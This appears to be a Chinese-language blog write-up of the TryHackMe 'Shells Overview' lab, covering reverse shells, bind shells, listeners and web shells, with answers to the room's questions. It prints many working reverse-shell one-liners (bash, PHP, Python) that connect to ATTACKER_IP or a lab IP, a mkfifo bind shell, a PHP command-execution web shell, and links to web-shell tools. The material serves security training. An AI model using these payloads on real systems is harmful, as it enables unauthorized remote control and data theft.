---
{"dg-publish":true,"permalink":"/tryhackme/tryhackme-shell：概括/","title":"tryhackme-shell：概括","tags":["tryhackme","linux"]}
---


![title](/img/user/images/tryhackme-shell：概括/title.png)
学习目标
在这个房间中，我们将讨论以下学习目标：

了解进攻性安全中的 Shell 
设置并使用反向和绑定 Shell
部署 Web Shell 

## task2
什么是 Shell？
Shell 是一种允许用户与操作系统交互的软件。它可以是图形界面，但通常是命令行界面，这取决于目标系统上运行的操作系统。

在网络安全中，它通常指攻击者在访问受感染系统时使用的特定 shell 会话，允许他们运行命令和执行软件。这 将允许攻击者执行多项活动，其中一些活动如下所述。

- 远程系统控制：允许攻击者在目标系统中远程执行命令或软件。
权限提升：如果通过 shell 的初始访问受到限制，攻击者可以探索将权限提升到更高级或管理访问权限的方法。

- 数据泄露：一旦攻击者获得 shell 的执行权限，他们就可以探索系统并读取和复制敏感数据。

- 持久性和维护性访问：一旦获得 shell 访问权限，攻击者可以通过用户和凭据创建访问权限或复制后门软件以维持对目标系统的访问权限以供日后使用。

- 后利用活动：获得对 shell 的访问权限后，攻击者可以执行各种后利用活动，例如部署恶意软件、创建隐藏帐户和删除信息。

- 访问网络上的其他系统：根据攻击者的意图，获得的 shell 可能只是一个初始访问点。目标可能是使用获得的 shell 作为枢轴，通过网络跳转到不同的目标，到达受感染系统网络中的不同点。这也称为枢轴转移(pivoting)。

![task2](/img/user/images/tryhackme-shell：概括/task2.png)

第一问是shell

第二问是用枢轴转移(pivoting)

第三问是用Privilege Escalation（权限提升）

## task3
反向 Shell(Reverse Shell)

反向 shell（有时也称为“连接回 shell”）是网络攻击中获取系统访问权限的最常用技术之一。连接从目标系统发起到攻击者的机器，这可以帮助避免被网络防火墙和其他安全设备检测到。

反向 Shell 的工作原理
设置 Netcat（nc）监听器
```
attacker@kali:~$ nc -lvnp 443
listening on [any] 4444 ...

# -l 选项指示 Netcat 监听或等待连接。
# -v选项启用详细模式。
# -n选项阻止连接使用 DNS 进行查找，因此它不会解析任何主机名，而是使用 IP 地址。
# -p标志指示将用于等待连接的端口
```

还有很多反向shell的使用 可以看这个[网站](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

![task3](/img/user/images/tryhackme-shell：概括/task3.png)

第一问毋庸置疑 reverse shell 反向shell

第二问使用netcat工具

## task4
绑定 Shell(Bind Shell)
顾名思义，绑定 shell 将绑定受感染系统上的端口并监听连接；当发生此连接时，它会暴露 shell 会话，以便攻击者可以远程执行命令。

当受感染目标不允许传出连接时可以使用这种方法，但它往往不太受欢迎，因为它需要保持活动状态并监听连接，这可能导致检测。

绑定 shell 的工作原理
在目标上设置绑定 Shell

让我们创建一个绑定 shell。在这种情况下，攻击者可以在目标机器上使用如下命令。

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```
{ #171f63}


有效载荷的解释
- rm -f /tmp/f- 此命令将删除位于 的任何现有命名管道文件/tmp/f/。这可确保脚本可以创建新的命名管道而不会发生冲突。

- mkfifo /tmp/f- 此命令在 处创建一个命名管道或 FIFO /tmp/f。命名管道允许进程之间进行双向通信。在这种情况下，它充当输入和输出的管道。

- cat /tmp/f- 此命令从命名管道读取数据。它等待可以通过管道发送的输入。

- | bash -i 2>&1- 的输出 cat通过管道传输到 shell 实例 ( bash -i)，这允许攻击者以交互方式执行命令。 将2>&1标准错误重定向到标准输出，确保将错误消息返回给攻击者。

- | nc -l 0.0.0.0 8080-l-在所有接口 ( 0.0.0.0) 和端口上以监听模式 ( ) 启动 Netcat 80

- >/tmp/f 最后部分将命令的输出发送回命名管道，实现双向通信。

低于 1024 的端口将需要提升的权限执行 Netcat

攻击者连接到Bind Shell

现在目标机器正在等待传入连接，我们可以再次使用 Netcat 使用以下命令进行连接。
```
nc -nv TARGET_IP 8080
```
命令说明
nc- 这将调用 Netcat，建立与目标的连接。
-n- 禁用DNS解析，使 Netcat 运行得更快并避免不必要的查找。
-v- 详细模式提供连接过程的详细输出，例如连接何时建立。
TARGET_IP- 运行绑定 shell 的目标机器的 IP 地址。
8080- 绑定 shell 监听的端口号。

![task4](/img/user/images/tryhackme-shell：概括/task4.png)

第一问是bind shell

第二问是1024 低于1024的都需要提升权限才能使用

## task5
shell监听器

### 1. Rlwrap

它是一个小型实用程序，使用 GNU readline 库来提供编辑键盘和历史记录。

使用示例（使用 Rlwrap 增强 Netcat Shell）

```
attacker@kali:~$ rlwrap nc -lvnp 443
listening on [any] 443 ...
```
允许使用箭头键和历史记录等功能实现更好的交互。

### 2. Ncat
Ncat
Ncat 是NMAP项目发布的 Netcat 的改进版本。它提供了加密（SSL）等额外功能。

```
attacker@kali:~$ ncat --ssl -lvnp 4444
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: B7AC F999 7FB0 9FF9 14F5 5F12 6A17 B0DC B094 AB7F
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
```

### 3. Socat
它是一个实用程序，允许您在两个数据源（在本例中是两个不同的主机）之间创建套接字连接。

默认使用示例（监听反向 Shell）：
```
attacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT
2024/09/23 15:44:38 socat[41135] N listening on AF=2 0.0.0.0:443
```
上述命令使用了-d选项来启用详细输出；再次使用 -d 将增加命令的详细程度。
该选项在端口 上TCP-LISTEN:443创建一个TCP443侦听器，为传入连接建立服务器套接字。最后，STDOUT选项将所有传入数据定向到终端。

![task5](/img/user/images/tryhackme-shell：概括/task5.png)

## task6
### bash
#### 1. 普通 Bash 反向 Shell
```
target@tryhackme:~$ bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1 
```
该反向 shell 启动一个交互式 bash shell，该 shell 通过TCP连接将输入和输出重定向到攻击者的 IP（ATTACKER_IP）上的端口443。>&运算符结合了标准输出和标准错误。


#### 2. Bash 读取行 反向 Shell
```
target@tryhackme:~$ exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done 
```
此反向 shell 创建一个新的文件描述符（5 在本例中）并连接到TCP套接字。它将从套接字读取并执行命令，并通过同一套接字将输出发回。


#### 3. 带有文件描述符 196 的 Bash 反向 Shell
```
target@tryhackme:~$ 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196 
```
此反向 shell 使用文件描述符（196 在本例中）建立TCP连接。它允许 shell 从网络读取命令并通过同一连接发送输出。


#### 4. 使用文件描述符 5 的 Bash 反向 Shell
```
	target@tryhackme:~$ bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```
与第一个例子类似，此命令打开一个 shell ( bash -i)，但它使用文件描述符进行输入和输出，从而通过TCP5连接实现交互式会话。

### PHP
#### 1. 使用 exec 函数实现PHP反向 Shell
```
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");' 
```
该反向shell 在端口上创建到攻击者IP的套接字连接443，并使用该 exec 函数执行shell，重定向标准输入和输出。


#### 2. 使用shell_exec 函数实现PHP反向 Shell
```
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
```
与上一个命令类似，但使用 shell_exec 函数。


#### 3. 使用 system 函数实现PHP反向 Shell
```
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");' 
```
该反向shell 采用了system 函数，执行命令并将结果输出到浏览器。

#### 4.使用 passthru 函数实现PHP反向 Shell
```
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
```
passthru函数执行命令并将原始输出发送回浏览器。这在处理二进制数据时很有用。

#### 5.使用 popen 函数实现PHP反向 Shell
```
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");' 
```
反向shell用于popen打开进程文件指针，从而允许执行shell。

### Python
#### 1.通过导出环境变量获取 Python 反向 Shell
```
target@tryhackme:~$ export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' 
```
该反向 shell 将远程主机和端口设置为环境变量，创建套接字连接，并复制套接字文件描述符以用于标准输入/输出。

#### 2.使用 subprocess 模块的 Python 反向 Shell
```
target@tryhackme:~$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' 
```
该反向shell使用该subprocess模块生成一个shell，并通过导出环境变量命令设置与Python反向shell类似的环境。

#### 3.简短的 Python 反向 Shell
```
target@tryhackme:~$ python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```
这个反向 shell 创建一个套接字 ( s)，连接到攻击者，并使用将标准输入、输出和错误重定向到套接字 os.dup2()。

![task6](/img/user/images/tryhackme-shell：概括/task6.png)

## task7
web shell

Web Shell 是用受感染 Web 服务器支持的语言编写的脚本，可通过 Web 服务器本身执行命令。Web Shell 通常是一个文件，其中包含执行命令和处理文件的代码。它可以隐藏在受感染的 Web 应用程序或服务中，因此很难被发现，在攻击者中非常受欢迎。

PHP Web Shell示例
让我们看一个PHP Web Shell 示例来了解这个过程是如何工作的：
```
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

上述shell可以保存到以PHP为扩展名的文件中，例如shell.php ，然后由攻击者利用无限制文件上传(Unrestricted File Upload)、文件包含(File Inclusion)、命令注入(Command Injection)等漏洞， 或通过获取未经授权的访问将其上传到Web服务器。  

在线web shell

[p0wny-shell](https://github.com/flozz/p0wny-shell)——一个简约的单文件PHP web shell，允许远程命令执行。

[b374k shell](https://github.com/b374k/b374k) - 功能更丰富的PHP web shell，具有文件管理和命令执行等功能。

![task7](/img/user/images/tryhackme-shell：概括/task7.png)

## task8
来俩练练手
![task7](/img/user/images/tryhackme-shell：概括/task8.png)

第一问 我是用了反弹shell
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc  10.10.250.106 443 >/tmp/f

nc -lvnp 443
```

![task7](/img/user/images/tryhackme-shell：概括/hash.png)

![task7](/img/user/images/tryhackme-shell：概括/flag1.png)

第二个事是简单写了一个php web shell
```
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```
先看看whoami 看一下用户

![task8](/img/user/images/tryhackme-shell：概括/whoami.png)

根据提示说 是在/目录 我们ls / 来看看文件

![task8](/img/user/images/tryhackme-shell：概括/ls.png)

发现了flag cat /flag.txt

![task8](/img/user/images/tryhackme-shell：概括/flag2.png)

这个反弹shell和web shell是真的复杂 简单介绍到此